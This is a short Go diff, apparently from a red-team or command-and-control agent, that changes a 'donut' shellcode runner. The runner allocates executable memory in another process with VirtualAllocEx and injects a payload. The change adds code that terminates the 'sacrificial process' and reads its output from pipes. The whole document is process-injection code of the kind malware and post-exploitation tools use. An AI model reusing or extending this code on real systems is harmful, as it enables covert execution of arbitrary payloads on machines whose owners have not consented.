@@ -11,7 +11,7 @@ import (
 )
 
 // Runner runner
-func Runner(donut []byte, handle syscall.Handle) (bool, string) {
+func Runner(donut []byte, handle syscall.Handle, stdout syscall.Handle, stdoutBytes *[]byte, stderr syscall.Handle, stderrBytes *[]byte) (bool, string) {
 
 	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READ)
 	if util.CheckErrorMessage(err) {
@@ -37,12 +37,22 @@ func Runner(donut []byte, handle syscall.Handle) (bool, string) {
 		return false, execute.ERROR_PID
 	}
 
+	//Terminate the sacrificial process
+	err = TerminateProcess(handle, 0)
+	if util.CheckErrorMessage(err) {
+		return false, execute.ERROR_PID
+	}
+
+	err = ReadFromPipes(stdout, stdoutBytes, stderr, stderrBytes)
+	if util.CheckErrorMessage(err) {
+		return false, execute.ERROR_PID
+	}
+
 	return true, execute.SUCCESS_PID
 }
 
-// IsAvailable does a shellcode runner exist
+// IsAvailable does a donut runner exist
 func IsAvailable() bool {
-
 
 	return true
 }
